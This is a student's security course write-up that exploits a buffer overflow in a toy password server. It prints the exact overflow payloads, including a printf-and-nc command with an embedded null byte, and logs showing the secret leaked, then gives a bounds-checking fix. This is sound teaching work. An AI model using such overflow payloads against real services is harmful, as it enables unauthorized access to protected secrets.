### CPSC 526 - Assignment 1
Alex Stevenson - 30073617

### Task 1:
 - The first attempt overflows the buffer, by filling it with 32 characters and then overflowing `aaaaa` into the expected password
 - The second attempt allows us to just enter the password `aaaaa` to get into the system

**Server Log**:
```
[UC alexander.stevenson@csx1 a1] ./server 2112 hello yeet
// Password at this point in time is "hello"
Waiting for a new connection...
Talking to someone.
Someone used an incorrect password.
// Password is now changed to "aaaaa"

Waiting for a new connection...
Talking to someone.
Someone used the correct password.
// Password is submitted as "aaaaa", the secret is leaked
```

**Client Log**:

The secret is: yeet

### Task 2:
 - This works because `strcmp` compares null terminated char buffers (aka strings). By starting the string with `12345\x00` it will treat this as the string `12345`
 - We then overflow the buffer such that the expected password is `12345`
 - It reads the entire thing into the buffer to overflow the expected password, but `strcmp` only compares `12345` with `12345` to leak the password immediately

**Server Log**:
```
[UC alexander.stevenson@csx1 a1] ./server 2112 hello yeet
Waiting for a new connection...
Talking to someone.
Someone used the correct password.
```

**Client Log**:
```
[UC alexander.stevenson@csx2 a1] printf '12345\x006789012345678901234567890112345' | nc csx1 2112

The secret is: yeet
```

### Task 3:
 - To remove the vulnerability, the easiest solution is to simply add a counter that ensures that the length of the string read into the buffer never exceeds the length of the buffer

**Code changes**:
```c
// Added a new len variable to keep track of buffer size
void readLineFromFd( int fd, char * buff, unsigned int len) {
	...
	// Begin a counter that counts up to the length
	unsigned int c = 0;
	while(1) {
		...
	    // leave one extra char for null terminator
	    if (c++ >= len - 2) break;
    }
    ...
}

// Then just make sure to set the length of the buffer correctly when calling the new function
int main( int argc, char ** argv) {
	...
	while(1) {
		...
		readLineFromFd( connSockFd, globals.buffer, 32);
		...
	}
	...
}
```
